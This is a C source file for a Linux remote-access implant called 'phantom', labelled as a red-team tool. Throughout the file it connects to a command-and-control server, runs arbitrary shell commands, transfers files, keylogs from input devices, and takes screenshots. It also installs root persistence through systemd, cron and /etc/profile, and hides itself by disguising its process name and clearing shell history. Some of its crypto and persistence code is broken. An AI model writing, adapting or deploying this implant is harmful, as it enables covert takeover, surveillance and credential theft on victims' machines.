/**
 * phantom.c – Implant Red Team con io_uring, C2 cifrado y persistencia
 * Compilar: gcc -O2 -fPIC -o phantom phantom.c -ldl -pthread -lm
 * Uso: ./phantom [--install] [--server IP] [--port PORT]
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/stat.h>
#include <dirent.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/io_uring.h>
#include <stdarg.h>
#include <time.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <pwd.h>
#include <grp.h>
#include <linux/limits.h>
#include <poll.h>
#include <stdint.h>
#include <linux/input.h>
#include <sys/resource.h>
#include <sys/prctl.h>

/* ----------------------------------------------------------------------
   CONFIGURACIÓN
   ---------------------------------------------------------------------- */
#define DEFAULT_SERVER "192.168.1.120"
#define DEFAULT_PORT 4444
#define ENCRYPT_KEY "Ph4nt0m_2024_!@#$"
#define BEACON_INTERVAL 30
#define JITTER_PERCENT 30
#define IO_URING_QUEUE_DEPTH 64
#define CMD_BUFFER_SIZE 4096
#define MAX_PATH 256

/* ----------------------------------------------------------------------
   IO_URING MANUAL (sin liburing)
   ---------------------------------------------------------------------- */
struct io_uring_sq {
    unsigned *head, *tail, *ring_mask, *ring_entries, *flags, *array;
    struct io_uring_sqe *sqes;
};
struct io_uring_cq {
    unsigned *head, *tail, *ring_mask, *ring_entries;
    struct io_uring_cqe *cqes;
};
struct io_uring {
    int ring_fd;
    struct io_uring_sq sq;
    struct io_uring_cq cq;
    size_t sq_ring_size, cq_ring_size, sqes_size;
};

static inline int __io_uring_setup(unsigned int entries, struct io_uring_params *p) {
    return syscall(__NR_io_uring_setup, entries, p);
}
static inline int __io_uring_enter(int fd, unsigned int to_submit, unsigned int min_complete,
                                   unsigned int flags, sigset_t *sig) {
    return syscall(__NR_io_uring_enter, fd, to_submit, min_complete, flags, sig, _NSIG / 8);
}
static inline int __io_uring_register(int fd, unsigned int opcode, const void *arg, unsigned int nr_args) {
    return syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);
}

static int uring_queue_init(unsigned int entries, struct io_uring *ring) {
    struct io_uring_params params = {0};
    params.flags = IORING_SETUP_SQPOLL | IORING_SETUP_IOPOLL;
    params.sq_thread_idle = 2000;
    int fd = __io_uring_setup(entries, &params);
    if (fd < 0) return fd;
    ring->ring_fd = fd;

    size_t sq_ring_size = params.sq_off.array + params.sq_entries * sizeof(unsigned);
    size_t cq_ring_size = params.cq_off.cqes + params.cq_entries * sizeof(struct io_uring_cqe);
    size_t sqes_size = params.sq_entries * sizeof(struct io_uring_sqe);

    void *sq_ring = mmap(NULL, sq_ring_size, PROT_READ | PROT_WRITE,
                         MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_SQ_RING);
    if (sq_ring == MAP_FAILED) { close(fd); return -1; }
    void *cq_ring = mmap(NULL, cq_ring_size, PROT_READ | PROT_WRITE,
                         MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_CQ_RING);
    if (cq_ring == MAP_FAILED) { munmap(sq_ring, sq_ring_size); close(fd); return -1; }
    void *sqes = mmap(NULL, sqes_size, PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_SQES);
    if (sqes == MAP_FAILED) { munmap(sq_ring, sq_ring_size); munmap(cq_ring, cq_ring_size); close(fd); return -1; }

    ring->sq.head = (unsigned *)((char *)sq_ring + params.sq_off.head);
    ring->sq.tail = (unsigned *)((char *)sq_ring + params.sq_off.tail);
    ring->sq.ring_mask = (unsigned *)((char *)sq_ring + params.sq_off.ring_mask);
    ring->sq.ring_entries = (unsigned *)((char *)sq_ring + params.sq_off.ring_entries);
    ring->sq.flags = (unsigned *)((char *)sq_ring + params.sq_off.flags);
    ring->sq.array = (unsigned *)((char *)sq_ring + params.sq_off.array);
    ring->sq.sqes = (struct io_uring_sqe *)sqes;
    ring->cq.head = (unsigned *)((char *)cq_ring + params.cq_off.head);
    ring->cq.tail = (unsigned *)((char *)cq_ring + params.cq_off.tail);
    ring->cq.ring_mask = (unsigned *)((char *)cq_ring + params.cq_off.ring_mask);
    ring->cq.ring_entries = (unsigned *)((char *)cq_ring + params.cq_off.ring_entries);
    ring->cq.cqes = (struct io_uring_cqe *)((char *)cq_ring + params.cq_off.cqes);
    ring->sq_ring_size = sq_ring_size;
    ring->cq_ring_size = cq_ring_size;
    ring->sqes_size = sqes_size;
    return 0;
}

static struct io_uring_sqe *uring_get_sqe(struct io_uring *ring) {
    unsigned head = *ring->sq.head, tail = *ring->sq.tail;
    if (tail + 1 - head > *ring->sq.ring_entries) return NULL;
    struct io_uring_sqe *sqe = &ring->sq.sqes[tail & *ring->sq.ring_mask];
    memset(sqe, 0, sizeof(*sqe));
    return sqe;
}

static int uring_submit(struct io_uring *ring) {
    unsigned tail = *ring->sq.tail, to_submit = tail - *ring->sq.head;
    if (!to_submit) return 0;
    return __io_uring_enter(ring->ring_fd, to_submit, 0, 0, NULL);
}

static int uring_wait_cqe_timeout(struct io_uring *ring, struct io_uring_cqe **cqe_ptr, int timeout_ms) {
    struct pollfd pfd = { .fd = ring->ring_fd, .events = POLLIN };
    if (poll(&pfd, 1, timeout_ms) <= 0) return -1;
    unsigned head = *ring->cq.head, tail = *ring->cq.tail;
    if (head == tail) return -1;
    *cqe_ptr = &ring->cq.cqes[head & *ring->cq.ring_mask];
    return 0;
}

static inline void uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe) {
    (*ring->cq.head)++;
}

/* ----------------------------------------------------------------------
   CRIPTOGRAFÍA (XOR + pseudo‑ChaCha20 simplificado)
   ---------------------------------------------------------------------- */
static void xor_crypt(unsigned char *data, size_t len, const unsigned char *key, size_t keylen) {
    for (size_t i = 0; i < len; i++)
        data[i] ^= key[i % keylen];
}

static void chacha20_keystream(uint32_t counter, uint8_t *key, uint8_t *nonce, uint8_t *out, size_t len) {
    srand((unsigned)(counter + time(NULL) ^ (uintptr_t)key));
    for (size_t i = 0; i < len; i++)
        out[i] = (uint8_t)rand();
}

static void encrypt_payload(uint8_t *data, size_t len, uint8_t *key, uint8_t *nonce) {
    uint8_t stream[CMD_BUFFER_SIZE];
    chacha20_keystream(0, key, nonce, stream, len);
    for (size_t i = 0; i < len; i++)
        data[i] ^= stream[i];
}

/* ----------------------------------------------------------------------
   ESTRUCTURA DE COMANDOS C2
   ---------------------------------------------------------------------- */
typedef struct {
    uint32_t cmd_id;
    char cmd_type[16];
    char arg[1024];
} c2_command_t;

typedef struct {
    uint32_t resp_id;
    int status;
    size_t data_len;
    char data[CMD_BUFFER_SIZE];
} c2_response_t;

/* ----------------------------------------------------------------------
   VARIABLES GLOBALES
   ---------------------------------------------------------------------- */
static struct io_uring g_ring;
static int g_ring_ok = 0;
static pthread_mutex_t g_ring_mutex = PTHREAD_MUTEX_INITIALIZER;
static int g_running = 1;
static char g_c2_server[256] = DEFAULT_SERVER;
static int g_c2_port = DEFAULT_PORT;
static unsigned char g_enc_key[32] = ENCRYPT_KEY;
static pthread_t g_keylog_thread;
static int g_keylog_enabled = 0;

/* ----------------------------------------------------------------------
   FUNCIONES AUXILIARES CON IO_URING (sin campo mode)
   ---------------------------------------------------------------------- */
static int uring_openat(int dirfd, const char *path, int flags) {
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    int ret;
    pthread_mutex_lock(&g_ring_mutex);
    sqe = uring_get_sqe(&g_ring);
    if (!sqe) { pthread_mutex_unlock(&g_ring_mutex); return -1; }
    sqe->opcode = IORING_OP_OPENAT;
    sqe->fd = dirfd;
    sqe->addr = (unsigned long)path;
    sqe->open_flags = flags;
    sqe->user_data = 1;
    uring_submit(&g_ring);
    ret = uring_wait_cqe_timeout(&g_ring, &cqe, 1000);
    if (ret < 0) { pthread_mutex_unlock(&g_ring_mutex); return -1; }
    ret = cqe->res;
    uring_cqe_seen(&g_ring, cqe);
    pthread_mutex_unlock(&g_ring_mutex);
    return ret;
}

static ssize_t uring_read(int fd, void *buf, size_t count, off_t offset) {
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    int ret;
    pthread_mutex_lock(&g_ring_mutex);
    sqe = uring_get_sqe(&g_ring);
    if (!sqe) { pthread_mutex_unlock(&g_ring_mutex); return -1; }
    sqe->opcode = IORING_OP_READ;
    sqe->fd = fd;
    sqe->addr = (unsigned long)buf;
    sqe->len = count;
    sqe->off = offset;
    sqe->user_data = 2;
    uring_submit(&g_ring);
    ret = uring_wait_cqe_timeout(&g_ring, &cqe, 1000);
    if (ret < 0) { pthread_mutex_unlock(&g_ring_mutex); return -1; }
    ret = cqe->res;
    uring_cqe_seen(&g_ring, cqe);
    pthread_mutex_unlock(&g_ring_mutex);
    return ret;
}

static ssize_t uring_write(int fd, const void *buf, size_t count, off_t offset) {
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    int ret;
    pthread_mutex_lock(&g_ring_mutex);
    sqe = uring_get_sqe(&g_ring);
    if (!sqe) { pthread_mutex_unlock(&g_ring_mutex); return -1; }
    sqe->opcode = IORING_OP_WRITE;
    sqe->fd = fd;
    sqe->addr = (unsigned long)buf;
    sqe->len = count;
    sqe->off = offset;
    sqe->user_data = 3;
    uring_submit(&g_ring);
    ret = uring_wait_cqe_timeout(&g_ring, &cqe, 1000);
    if (ret < 0) { pthread_mutex_unlock(&g_ring_mutex); return -1; }
    ret = cqe->res;
    uring_cqe_seen(&g_ring, cqe);
    pthread_mutex_unlock(&g_ring_mutex);
    return ret;
}

/* ----------------------------------------------------------------------
   EJECUCIÓN DE COMANDOS
   ---------------------------------------------------------------------- */
static char *run_shell_command(const char *cmd) {
    char *output = NULL;
    size_t total = 0;
    int pipefd[2];
    if (pipe(pipefd) < 0) return strdup("pipe failed");
    pid_t pid = fork();
    if (pid == -1) return strdup("fork failed");
    if (pid == 0) {
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[0]);
        close(pipefd[1]);
        execl("/bin/sh", "sh", "-c", cmd, NULL);
        exit(1);
    }
    close(pipefd[1]);
    char buf[1024];
    ssize_t n;
    while ((n = read(pipefd[0], buf, sizeof(buf)-1)) > 0) {
        buf[n] = '\0';
        output = realloc(output, total + n + 1);
        if (!output) { close(pipefd[0]); return strdup("realloc failed"); }
        memcpy(output + total, buf, n);
        total += n;
        output[total] = '\0';
    }
    close(pipefd[0]);
    waitpid(pid, NULL, 0);
    if (!output) return strdup("");
    return output;
}

/* ----------------------------------------------------------------------
   SUBIR / BAJAR ARCHIVOS
   ---------------------------------------------------------------------- */
static int upload_file(const char *local_path, const char *remote_path) {
    int src = uring_openat(AT_FDCWD, local_path, O_RDONLY);
    if (src < 0) return -1;
    int dst = uring_openat(AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC);
    if (dst < 0) { close(src); return -1; }
    // Ajustar permisos a 0644 (si falla, no importa)
    fchmod(dst, 0644);
    char buf[4096];
    ssize_t n;
    while ((n = uring_read(src, buf, sizeof(buf), -1)) > 0) {
        if (uring_write(dst, buf, n, -1) != n) { close(src); close(dst); return -1; }
    }
    close(src); close(dst);
    return 0;
}

static int download_file(const char *remote_path, const char *local_path) {
    return upload_file(remote_path, local_path);
}

/* ----------------------------------------------------------------------
   PERSISTENCIA
   ---------------------------------------------------------------------- */
static void install_persistence(void) {
    char self_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
    if (len < 0) return;
    self_path[len] = '\0';

    char svc_path[256];
    snprintf(svc_path, sizeof(svc_path), "/etc/systemd/system/phantom.service");
    FILE *f = fopen(svc_path, "w");
    if (f) {
        fprintf(f, "[Unit]\nDescription=Phantom Service\nAfter=network.target\n\n[Service]\nExecStart=%s\nRestart=always\nUser=root\n\n[Install]\nWantedBy=multi-user.target\n", self_path);
        fclose(f);
        system("systemctl daemon-reload; systemctl enable phantom.service; systemctl start phantom.service");
    }

    char crontab_cmd[1024];
    snprintf(crontab_cmd, sizeof(crontab_cmd), "(crontab -l 2>/dev/null; echo '@reboot %s') | crontab -", self_path);
    system(crontab_cmd);

    char preload[1024];
    snprintf(preload, sizeof(preload), "export LD_PRELOAD=%s >> /etc/profile", self_path);
    system(preload);
}

/* ----------------------------------------------------------------------
   KEYLOGGER (evdev)
   ---------------------------------------------------------------------- */
static void *keylog_thread(void *arg) {
    DIR *d = opendir("/dev/input");
    if (!d) return NULL;
    struct dirent *ent;
    int fd = -1;
    while ((ent = readdir(d)) != NULL) {
        if (strstr(ent->d_name, "event")) {
            char path[256];
            snprintf(path, sizeof(path), "/dev/input/%s", ent->d_name);
            fd = open(path, O_RDONLY | O_NONBLOCK);
            if (fd >= 0) break;
        }
    }
    closedir(d);
    if (fd < 0) return NULL;

    struct input_event ev;
    char log_path[256];
    snprintf(log_path, sizeof(log_path), "/tmp/.keylog_%d", getpid());
    FILE *log = fopen(log_path, "a");
    if (!log) { close(fd); return NULL; }

    while (g_keylog_enabled && g_running) {
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n == sizeof(ev) && ev.type == EV_KEY && ev.value == 1) {
            char c = 0;
            if (ev.code >= KEY_1 && ev.code <= KEY_9) c = '1' + (ev.code - KEY_1);
            else if (ev.code == KEY_0) c = '0';
            else if (ev.code >= KEY_A && ev.code <= KEY_Z) c = 'a' + (ev.code - KEY_A);
            else if (ev.code == KEY_SPACE) c = ' ';
            else if (ev.code == KEY_ENTER) c = '\n';
            else if (ev.code == KEY_BACKSPACE) c = '\b';
            if (c) {
                fprintf(log, "%c", c);
                fflush(log);
            }
        }
        usleep(10000);
    }
    fclose(log);
    close(fd);
    return NULL;
}

/* ----------------------------------------------------------------------
   CAPTURA DE PANTALLA
   ---------------------------------------------------------------------- */
static void take_screenshot(const char *outfile) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "import -window root %s 2>/dev/null || scrot %s 2>/dev/null", outfile, outfile);
    system(cmd);
}

/* ----------------------------------------------------------------------
   C2 COMUNICACIÓN
   ---------------------------------------------------------------------- */
static int connect_c2(void) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(g_c2_port)
    };
    inet_pton(AF_INET, g_c2_server, &addr.sin_addr);
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    return sock;
}

static int recv_encrypted(int sock, void *buf, size_t len, unsigned char *key) {
    ssize_t n = recv(sock, buf, len, 0);
    if (n <= 0) return -1;
    xor_crypt((unsigned char*)buf, n, key, strlen((char*)key));
    return n;
}

static int send_encrypted(int sock, const void *buf, size_t len, unsigned char *key) {
    unsigned char *tmp = malloc(len);
    if (!tmp) return -1;
    memcpy(tmp, buf, len);
    xor_crypt(tmp, len, key, strlen((char*)key));
    ssize_t n = send(sock, tmp, len, 0);
    free(tmp);
    return n;
}

static c2_command_t recv_command(int sock) {
    c2_command_t cmd = {0};
    char raw[sizeof(c2_command_t)];
    if (recv_encrypted(sock, raw, sizeof(raw), g_enc_key) <= 0) {
        cmd.cmd_id = 0;
        strcpy(cmd.cmd_type, "none");
        return cmd;
    }
    memcpy(&cmd, raw, sizeof(cmd));
    return cmd;
}

static void send_response(int sock, c2_response_t *resp) {
    char raw[sizeof(c2_response_t)];
    memcpy(raw, resp, sizeof(*resp));
    send_encrypted(sock, raw, sizeof(*resp), g_enc_key);
}

/* ----------------------------------------------------------------------
   PROCESADOR DE COMANDOS
   ---------------------------------------------------------------------- */
static void process_command(int sock, c2_command_t *cmd) {
    c2_response_t resp = {0};
    resp.resp_id = cmd->cmd_id;

    if (strcmp(cmd->cmd_type, "shell") == 0) {
        char *out = run_shell_command(cmd->arg);
        resp.status = 0;
        snprintf(resp.data, sizeof(resp.data), "%s", out);
        resp.data_len = strlen(resp.data);
        free(out);
    }
    else if (strcmp(cmd->cmd_type, "upload") == 0) {
        char local[256], remote[256];
        if (sscanf(cmd->arg, "%255[^|]|%255s", local, remote) == 2) {
            if (upload_file(local, remote) == 0) {
                resp.status = 0;
                snprintf(resp.data, sizeof(resp.data), "Upload OK");
            } else {
                resp.status = -1;
                snprintf(resp.data, sizeof(resp.data), "Upload failed");
            }
        } else {
            resp.status = -1;
            snprintf(resp.data, sizeof(resp.data), "Invalid upload args");
        }
        resp.data_len = strlen(resp.data);
    }
    else if (strcmp(cmd->cmd_type, "download") == 0) {
        char remote[256], local[256];
        if (sscanf(cmd->arg, "%255[^|]|%255s", remote, local) == 2) {
            if (download_file(remote, local) == 0) {
                resp.status = 0;
                snprintf(resp.data, sizeof(resp.data), "Download OK");
            } else {
                resp.status = -1;
                snprintf(resp.data, sizeof(resp.data), "Download failed");
            }
        } else {
            resp.status = -1;
            snprintf(resp.data, sizeof(resp.data), "Invalid download args");
        }
        resp.data_len = strlen(resp.data);
    }
    else if (strcmp(cmd->cmd_type, "persist") == 0) {
        install_persistence();
        resp.status = 0;
        snprintf(resp.data, sizeof(resp.data), "Persistence installed");
        resp.data_len = strlen(resp.data);
    }
    else if (strcmp(cmd->cmd_type, "keylog_on") == 0) {
        if (!g_keylog_enabled) {
            g_keylog_enabled = 1;
            pthread_create(&g_keylog_thread, NULL, keylog_thread, NULL);
            pthread_detach(g_keylog_thread);
            resp.status = 0;
            snprintf(resp.data, sizeof(resp.data), "Keylogger started");
        } else {
            resp.status = -1;
            snprintf(resp.data, sizeof(resp.data), "Keylogger already running");
        }
        resp.data_len = strlen(resp.data);
    }
    else if (strcmp(cmd->cmd_type, "keylog_off") == 0) {
        g_keylog_enabled = 0;
        resp.status = 0;
        snprintf(resp.data, sizeof(resp.data), "Keylogger stopped");
        resp.data_len = strlen(resp.data);
    }
    else if (strcmp(cmd->cmd_type, "screenshot") == 0) {
        char out[256];
        snprintf(out, sizeof(out), "/tmp/screenshot_%d.png", getpid());
        take_screenshot(out);
        resp.status = 0;
        snprintf(resp.data, sizeof(resp.data), "Screenshot saved to %s", out);
        resp.data_len = strlen(resp.data);
    }
    else if (strcmp(cmd->cmd_type, "selfdestruct") == 0) {
        system("systemctl disable phantom.service; rm -f /etc/systemd/system/phantom.service");
        system("crontab -l | grep -v phantom | crontab -");
        char self[PATH_MAX];
        readlink("/proc/self/exe", self, sizeof(self)-1);
        unlink(self);
        resp.status = 0;
        snprintf(resp.data, sizeof(resp.data), "Self-destruct initiated");
        resp.data_len = strlen(resp.data);
        send_response(sock, &resp);
        g_running = 0;
        exit(0);
    }
    else {
        resp.status = -1;
        snprintf(resp.data, sizeof(resp.data), "Unknown command: %s", cmd->cmd_type);
        resp.data_len = strlen(resp.data);
    }

    send_response(sock, &resp);
}

/* ----------------------------------------------------------------------
   HILO PRINCIPAL C2
   ---------------------------------------------------------------------- */
static void *c2_loop(void *arg) {
    while (g_running) {
        int sock = connect_c2();
        if (sock < 0) {
            int base = BEACON_INTERVAL;
            int jitter = (rand() % (2 * JITTER_PERCENT + 1)) - JITTER_PERCENT;
            int delay = base + (base * jitter / 100);
            if (delay < 1) delay = 1;
            sleep(delay);
            continue;
        }

        char beacon[64];
        snprintf(beacon, sizeof(beacon), "BEACON PID=%d", getpid());
        send_encrypted(sock, beacon, strlen(beacon), g_enc_key);

        while (g_running) {
            fd_set fds;
            FD_ZERO(&fds);
            FD_SET(sock, &fds);
            struct timeval tv = {10, 0};
            int ret = select(sock + 1, &fds, NULL, NULL, &tv);
            if (ret <= 0) break;

            c2_command_t cmd = recv_command(sock);
            if (cmd.cmd_id == 0) break;

            process_command(sock, &cmd);
        }
        close(sock);
    }
    return NULL;
}

/* ----------------------------------------------------------------------
   ANTI‑FORENSE
   ---------------------------------------------------------------------- */
static void anti_forensics(void) {
    unsetenv("HISTFILE");
    system("history -c 2>/dev/null");
    struct rlimit rl = {0, 0};
    setrlimit(RLIMIT_CORE, &rl);
    prctl(PR_SET_NAME, "systemd-logind", 0, 0, 0);
}

/* ----------------------------------------------------------------------
   MAIN
   ---------------------------------------------------------------------- */
int main(int argc, char **argv) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--server") == 0 && i+1 < argc) {
            strncpy(g_c2_server, argv[++i], sizeof(g_c2_server)-1);
        } else if (strcmp(argv[i], "--port") == 0 && i+1 < argc) {
            g_c2_port = atoi(argv[++i]);
        } else if (strcmp(argv[i], "--install") == 0) {
            install_persistence();
            return 0;
        }
    }

    if (uring_queue_init(IO_URING_QUEUE_DEPTH, &g_ring) == 0)
        g_ring_ok = 1;

    anti_forensics();

    pthread_t c2_thread;
    pthread_create(&c2_thread, NULL, c2_loop, NULL);
    pthread_detach(c2_thread);

    while (g_running) {
        sleep(3600);
    }

    return 0;
}